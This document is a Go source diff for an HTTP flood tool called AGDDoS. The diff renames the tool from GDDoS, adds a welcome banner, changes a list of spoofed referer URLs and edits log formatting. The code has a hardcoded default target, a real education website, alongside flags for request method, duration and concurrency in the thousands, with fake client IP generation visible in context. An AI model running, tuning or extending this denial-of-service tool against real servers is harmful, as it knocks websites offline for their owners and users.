@@ -1,6 +1,5 @@
 package main
 
-// go run GDDoS.go -m HEAD -dm 15 -ims 1 -cc 10000
 import (
 	"context"
 	"flag"
@@ -21,7 +20,7 @@ var (
 	ConcurrencyCount    int
 	DurationMinute      int
 
-	//TODO：Proxy
+	//TODO：Socks5 Proxy
 	DDosHttpClient = &http.Client{
 		Transport: &http.Transport{
 			DialContext: func(ctx context.Context, network, addr string) (conn net.Conn, e error) {
@@ -63,9 +62,10 @@ var (
 		"https://blog.csdn.net/",
 		"https://help.baidu.com/searchResult?keywords=",
 		"https://steamcommunity.com/market/search?q=",
-		"https://baike.sogou.com/v7752987.htm",
-		"https://www.baidu.com/s?wd=%E4%B8%AD%E7%82%B9%E5%9B%9B%E8%BE%B9%E5%BD%A2",
-		"https://www.midishow.com/",
+		"https://wx.zsxq.com/",
+		"https://www.android-ide.com/tutorial_androidapp.html",
+		"https://www.baidu.com/s?ie=utf-8&wd=AGDDoS%2FAGDDoS",
+		"https://www.baidu.com/s?ie=utf-8&wd=github.com%2FAGDDoS%2FAGDDoS",
 		// Don't forget to add ourselves!
 		"https://github.com/AGDDoS/AGDDoS",
 	}
@@ -73,7 +73,8 @@ var (
 
 // Main Function
 func main() {
-	defaultTargetUrl := "https://kzkt.tianyuyun.com/static/h5_new_4.6.5.115/index.html" // Bye @Peter1303, i don't mean it!
+	printWelcome()
+	defaultTargetUrl := "https://kzkt.tianyuyun.com/static/h5_new_4.6.5.115/index.html"
 
 	flag.StringVar(&Method, "m", "GET", "DDoS Method(GET/POST/HEAD/...)")
 	flag.StringVar(&TargetUrl, "u", defaultTargetUrl, "Taget URL")
@@ -83,7 +84,7 @@ func main() {
 	flag.Parse()
 
 	/*if TargetUrl == defaultTargetUrl {
-		fmt.Printf("TargetUrl is %s, 请尝试通过命令行重传参数启动(TargetUrl 不能等于 defaultTargetUrl). Usage：./GDDoS -h\n", TargetUrl)
+		fmt.Printf("TargetUrl is %s, 请尝试通过命令行重传参数启动(TargetUrl 不能等于 defaultTargetUrl). Usage：./AGDDoS -h\n", TargetUrl)
 		return
 	}
 	*/
@@ -145,10 +146,23 @@ func genIpaddr() string {
 	return ip
 }
 
+func printWelcome() {
+	fmt.Println("+----------------------------------------------------------------+")
+	fmt.Println("| Welcome to use AGDDOS.                                         |")
+	fmt.Println("| Code by AGDDoS Team                                            |")
+	fmt.Println("| If you have some problem when you use the tool,                |")
+	fmt.Println("| please submit issue at : https://github.com/AGDDoS/AGDDoS      |")
+	fmt.Println("+----------------------------------------------------------------+")
+	fmt.Println()
+	// sleep one second because the fmt is not thread-safety.
+	// if not to do this, fmt.Print will print after the log.Print.
+	time.Sleep(time.Second)
+}
+
 func Log(grindex int, i int, responseStatus string) {
-	fmt.Printf("[GDDoS#%d/%d]%s \033[0m \n", grindex, i, responseStatus) // 默认 [GDDoS#并发线程数/线程重复数] (Get "https://1.1.1.1": dial tcp 1.1.1.1:443: i/o timeout)
+	fmt.Printf("[INFO][AGDDoS#%d/%d]%s \033[0m \n", grindex, i, responseStatus) // 默认 [INFO][AGDDoS#当前线程序号/第i次重复] (Get "https://1.1.1.1": dial tcp 1.1.1.1:443: i/o timeout)
 }
 
 func PrintError(grindex int, i int, responseStatus string) {
-	fmt.Printf("[Error#%d/%d] \033[1;31;40m (%s) \033[0m \n", grindex, i, responseStatus) // 默认
+	fmt.Printf("[Error][AGDDoS#%d/%d] \033[1;31;40m (%s) \033[0m \n", grindex, i, responseStatus) // 默认
 }
